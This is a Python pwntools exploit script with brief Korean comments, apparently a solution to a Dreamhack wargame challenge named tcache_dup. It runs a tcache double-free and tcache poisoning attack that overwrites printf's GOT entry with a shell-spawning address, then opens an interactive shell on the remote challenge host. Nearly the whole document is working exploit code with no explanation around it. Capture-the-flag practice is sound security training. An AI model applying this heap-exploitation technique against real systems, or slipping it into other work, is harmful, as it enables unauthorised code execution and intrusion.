# 10번까지 할당 가능한 문제

from pwn import *

p = process("./tcache_dup")
p = remote("host1.dreamhack.games", 15358)
e = ELF("./tcache_dup")

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

def create(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def delete(index):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(index))

create(0x30, "aaaa")
delete(0)
delete(0)
#tcachebins 리스트에 2개의 청크 연결

get_shell = 0x400ab0
free_got = e.got["free"]
malloc_got = e.got["malloc"]
printf_got = e.got["printf"]
print("printf_got: ", hex(printf_got))

create(0x30, p64(printf_got))
create(0x30, p64(get_shell))
create(0x30, p64(get_shell))

p.interactive()